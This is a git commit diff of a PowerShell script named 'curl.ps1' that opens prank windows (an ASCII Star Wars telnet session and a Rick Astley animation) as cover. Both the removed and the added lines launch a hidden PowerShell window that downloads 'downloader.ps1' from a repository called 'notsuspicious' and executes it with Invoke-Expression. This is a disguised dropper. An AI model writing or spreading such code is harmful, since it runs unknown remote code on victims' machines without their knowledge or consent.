3f9db62ae803996a0265ec9e32519556c898ecb0
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-04 10:05:32 +0100

    Update curl.ps1

--- curl.ps1
+++ curl.ps1
@@ -5,13 +5,5 @@ Start-Process cmd -ArgumentList "/c start telnet towel.blinkenlights.nl" -Window
 Start-Process cmd -ArgumentList "/c start cmd /k curl ascii.live/rick" -WindowStyle Normal
 
 # Wait for a moment to let the windows start
-Start-Sleep -Seconds 5
-
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = "powershell.exe"
-$psi.Arguments = "-WindowStyle Hidden -NoLogo -NoProfile -Command `"Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content`""
-$psi.UseShellExecute = $false
-$psi.RedirectStandardOutput = $true
-
-$p = [System.Diagnostics.Process]::Start($psi)
+Start-Process powershell -ArgumentList "-WindowStyle Hidden", "-NoLogo", "-NoProfile", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content"
 
